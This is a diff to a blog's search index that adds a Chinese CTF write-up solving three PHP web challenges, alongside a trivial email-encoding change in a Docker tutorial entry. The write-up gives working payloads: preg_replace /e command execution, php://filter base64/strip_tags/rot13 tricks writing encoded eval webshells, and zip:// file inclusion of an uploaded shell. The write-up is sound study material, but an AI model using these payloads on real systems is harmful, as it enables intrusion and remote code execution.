@@ -4,6 +4,89 @@
   
     
     <entry>
+      <title><![CDATA[week 7 for cnas writeup]]></title>
+      <url>http://uknowsec.cn/posts/ctf/week-7-for-cnas-writeup.html</url>
+      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
+<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>preg_replace() 函数用于正则表达式的搜索和替换。</p>
+<h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed preg_replace( mixed pattern, mixed replacement, mixed subject [, int limit ] )</div></pre></td></tr></table></figure>
+<h5 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h5><table>
+<thead>
+<tr>
+<th>参数</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>pattern</td>
+<td style="text-align:center">正则表达式</td>
+</tr>
+<tr>
+<td>replacement</td>
+<td style="text-align:center">替换的内容</td>
+</tr>
+<tr>
+<td>subject</td>
+<td style="text-align:center">需要匹配替换的对象</td>
+</tr>
+<tr>
+<td>limit</td>
+<td style="text-align:center">可选，指定替换的个数，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换</td>
+</tr>
+</tbody>
+</table>
+<h5 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h5><p>当Pattern参数使用/e修正符时，preg_replace函数会将replacement参数当作 PHP代码执行，那么，针对此种情况，当replacement内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。</p>
+<p>由以上知识点可以得到本题的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28001/01.php?a=/c/e&amp;b=system(&apos;cat flag.php&apos;)&amp;3=c</div></pre></td></tr></table></figure>
+<h2 id="exit-150"><a href="#exit-150" class="headerlink" title="exit 150"></a>exit 150</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="external">http://47.100.121.220:28002</a></p>
+<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__FILE__); </div><div class="line">$c = &quot;&lt;?php exit;?&gt;&quot;; </div><div class="line">@$c.=$_GET[&apos;c&apos;]; </div><div class="line">@$filename = $_GET[&apos;file&apos;]; </div><div class="line">@file_put_contents($filename, $c); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>题目给出了源码，我们可以看出这里是利用file_put_contents()函数来写shell，但是写入的shell里开头会加上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php exit;?&gt;;</div></pre></td></tr></table></figure>
+<p>导致shell中写入的内容无法被解析，这里我们就需要想办法绕过这段代码</p>
+<p>之前看过P神的一篇文章有讲过这个“死亡exit”的问题</p>
+<p>具体可以参考P神博客</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="external">谈一谈php://filter的妙用</a></p>
+<p>博客里介绍了三种方法绕过</p>
+<p>第一种使用php://filter/write=convert.base64-decode</p>
+<p>正如P神博客说的</p>
+<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是&lt;?php exit; ?&gt;没有了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=convert.base64-decode/resource=z.php&amp;c=aPD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+</div></pre></td></tr></table></figure>
+<p>我本地环境可以写Shell，连接菜刀可以。但是题目环境不行。</p>
+<p>我们可以尝试写system函数读取flag，查看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=convert.base64-decode/resource=z.php&amp;c=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</div></pre></td></tr></table></figure>
+<p>第二种使用php://filter/write=string.strip_tags|convert.base64-decode/resource</p>
+<p>php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=z.php&amp;c=PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOz8+</div></pre></td></tr></table></figure>
+<p>这个payload跟php版本有关的，我本地5.4的可以。题目环境不行。</p>
+<p>第三种使用php://filter/write=string.rot13/resource</p>
+<p>利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。&lt;?php exit; ?&gt;在经过rot13编码后会变成&lt;?cuc rkvg; ?&gt;，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=string.rot13/resource=a.php&amp;c=&lt;?cuc @riny($_CBFG[&apos;n&apos;]);?&gt;</div></pre></td></tr></table></figure>
+<p>菜刀链接，如果不连接不上可以用system函数。</p>
+<h2 id="easy-gallery-250"><a href="#easy-gallery-250" class="headerlink" title="easy_gallery 250"></a>easy_gallery 250</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003" target="_blank" rel="external">http://47.100.121.220:28003</a></p>
+<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>这个题目是jarvisoj平台的一个原题的改编，链接如下：</p>
+<p><a href="http://web.jarvisoj.com:32785" target="_blank" rel="external">http://web.jarvisoj.com:32785</a></p>
+<p>但是基本的利用点是相同的，那就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?page=</div></pre></td></tr></table></figure>
+<p>这个地方存在一个文件包含的漏洞，这个地方可以利用到</p>
+<p>具体可以看到我上传完后取下来的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	require(&quot;header.php&quot;);</div><div class="line">	$page=&quot;&quot;;</div><div class="line">	if (isset($_GET[&apos;page&apos;]))</div><div class="line">		$page=$_GET[&apos;page&apos;].&quot;.php&quot;;</div><div class="line">	else</div><div class="line">		$page=&quot;main.php&quot;;</div><div class="line">	include($page);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这个地方加上了一个.php是一个利用点。</p>
+<p>根据原题的解题思路上传.jpg，然后利用这个文件包含点，%00截断是不行的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?page=图片ID.jpg%00</div></pre></td></tr></table></figure>
+<p>在甜哥提醒下还是利用到了PHP伪协议，突然发现PHP伪协议在CTF题目利用到的很多</p>
+<p>这里利用到zip://这个协议，具体可以参考我的博客</p>
+<p><a href="http://uknowsec.cn/posts/notes/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%BB%93.html">php支持的协议和封装协议小结</a></p>
+<p>这里我们可以结合zip://和文件包含来解析我们的shell</p>
+<p>具体，我们想写一个shell.php，zip打包，把扩展名改为.jpg上传</p>
+<p>在文件包含利用点用以下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28003/index.php?page=zip://uploads/图片ID.jpg#shell</div></pre></td></tr></table></figure>
+<p>根据zip协议的知识和view的代码，shell后加上.php后缀。这样就可以被解析了。</p>
+<p>我们就可以用菜刀连接到shell.php得到flag。</p>
+]]></content>
+    </entry>
+    
+    <entry>
       <title><![CDATA[week 6 for cnas writeup]]></title>
       <url>http://uknowsec.cn/posts/ctf/week-6-for-cnas-writeup.html</url>
       <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
@@ -942,7 +1025,7 @@
 <h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#x66;&#111;&#x6f;&#x40;&#x62;&#x61;&#x72;&#46;&#x63;&#x6f;&#109;">&#x66;&#111;&#x6f;&#x40;&#x62;&#x61;&#x72;&#46;&#x63;&#x6f;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#102;&#x6f;&#x6f;&#64;&#98;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;">&#102;&#x6f;&#x6f;&#64;&#98;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
